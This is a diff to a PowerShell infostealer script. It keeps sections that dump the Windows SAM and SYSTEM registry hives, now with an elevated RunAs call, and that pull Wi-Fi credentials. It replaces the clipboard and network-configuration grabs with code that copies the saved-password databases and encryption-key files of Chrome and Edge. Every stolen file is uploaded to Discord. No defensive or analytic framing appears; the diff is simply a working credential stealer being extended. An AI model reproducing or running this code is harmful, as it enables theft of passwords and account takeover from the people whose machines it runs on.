@@ -41,8 +41,7 @@ function Send-FileToDiscord {
 
 # Extract SAM and SYSTEM Registry Hives
 try {
-    reg save HKLM\SAM sam /y
-    reg save HKLM\SYSTEM system /y
+    Start-Process "cmd.exe" -ArgumentList "/c reg save HKLM\SAM sam /y & reg save HKLM\SYSTEM system /y" -Verb RunAs -NoNewWindow -Wait
     Send-FileToDiscord -filePath ".\sam" -fileName "SAM"
     Send-FileToDiscord -filePath ".\system" -fileName "SYSTEM"
     Remove-Item ".\sam", ".\system" -Force
@@ -69,20 +68,26 @@ try {
     Write-Host "Error extracting Wi-Fi credentials: $_"
 }
 
-# Extract Network Configuration
+# Extract Browser Saved Credentials (Chrome and Edge)
 try {
-    $netConfig = Get-NetIPAddress | Out-String
-    Send-PayloadToDiscord -content "Network Configuration:`n$netConfig"
+    $browsers = @("Google\\Chrome", "Microsoft\\Edge")
+    foreach ($browser in $browsers) {
+        $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
+        $localState = "$env:LOCALAPPDATA\$browser\User Data\Local State"
+        if (Test-Path $loginData -and Test-Path $localState) {
+            $tempDir = "$env:TEMP\$browser"
+            New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+            Copy-Item $loginData $tempDir -Force
+            Copy-Item $localState $tempDir -Force
+            Send-FileToDiscord -filePath "$tempDir\Login Data" -fileName "$browser_LoginData"
+            Send-FileToDiscord -filePath "$tempDir\Local State" -fileName "$browser_LocalState"
+            Remove-Item $tempDir -Recurse -Force
+            Send-PayloadToDiscord -content "Browser: $browser - Login Data and Local State files uploaded."
+        }
+    }
 } catch {
-    Write-Host "Error extracting network configuration: $_"
-}
-
-# Extract Clipboard Content
-try {
-    $clipboard = Get-Clipboard
-    Send-PayloadToDiscord -content "Clipboard Content:`n$clipboard"
-} catch {
-    Write-Host "Error extracting clipboard content: $_"
+    Write-Host "Error extracting browser credentials: $_"
+    Send-PayloadToDiscord -content "Error extracting browser credentials: $_"
 }
 
 # List Files in My Documents
